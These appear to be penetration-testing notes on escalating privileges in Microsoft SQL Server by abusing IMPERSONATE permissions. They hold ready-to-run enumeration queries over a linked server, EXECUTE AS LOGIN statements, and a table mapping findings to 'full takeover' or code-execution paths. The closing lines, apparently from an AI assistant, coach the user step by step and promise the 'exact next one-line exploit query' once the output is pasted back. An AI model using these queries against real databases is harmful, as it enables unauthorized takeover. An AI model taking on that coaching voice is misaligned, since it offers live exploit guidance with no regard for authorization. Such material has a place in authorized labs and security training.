if you have impersonate priv in MSSQL, you can run commands as the context of that user.
```
SQL (kevin  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor
----------   --------   ---------------   ----------   -------   -------
b'LOGIN'     b''        IMPERSONATE       GRANT        kevin     appdev
```

impersonation
```
EXECUTE AS LOGIN = 'appdev';
```

---

### 1️⃣ Enumerate users you can impersonate (IMPERSONATE permission)

```sql
SELECT * FROM OPENQUERY([WEB\CLIENTS],'SELECT USER_NAME(grantor_principal_id) AS grantor,USER_NAME(grantee_principal_id) AS grantee,permission_name FROM sys.database_permissions WHERE permission_name=''IMPERSONATE''')
```

---

### 2️⃣ Enumerate server-level impersonation (LOGIN impersonation)

```sql
SELECT * FROM OPENQUERY([WEB\CLIENTS],'SELECT sp.name AS target_login,sp2.name AS grantee FROM sys.server_permissions p JOIN sys.server_principals sp ON p.major_id=sp.principal_id JOIN sys.server_principals sp2 ON p.grantee_principal_id=sp2.principal_id WHERE p.permission_name=''IMPERSONATE''')
```

---

### 3️⃣ Check if you can impersonate **dbo** (common escalation)

```sql
SELECT * FROM OPENQUERY([WEB\CLIENTS],'SELECT HAS_PERMS_BY_NAME(''dbo'',''USER'',''IMPERSONATE'')')
```

---

### 4️⃣ Check if you can impersonate **sa** (rare but fatal)

```sql
SELECT * FROM OPENQUERY([WEB\CLIENTS],'SELECT HAS_PERMS_BY_NAME(''sa'',''LOGIN'',''IMPERSONATE'')')
```

---

### 5️⃣ Enumerate logins with TRUSTWORTHY + ownership chaining risk

```sql
SELECT * FROM OPENQUERY([WEB\CLIENTS],'SELECT name,is_trustworthy_on FROM sys.databases')
```

---

### How to interpret results

|Result|Meaning|
|---|---|
|IMPERSONATE on **dbo**|Immediate privilege escalation|
|IMPERSONATE on **sysadmin** login|Full takeover|
|TRUSTWORTHY = 1 + db_owner|CLR / code exec path|
|No impersonation|Move to Agent / credentials|

---

### If you find impersonation

Next step is **single-statement execution** like:

```sql
EXECUTE AS LOGIN='target'; SELECT SYSTEM_USER;
```

But **only if impersonation exists**.

---

Run **query #1 and #2**, paste output.  
I’ll give you the **exact next one-line exploit query** based on what you find.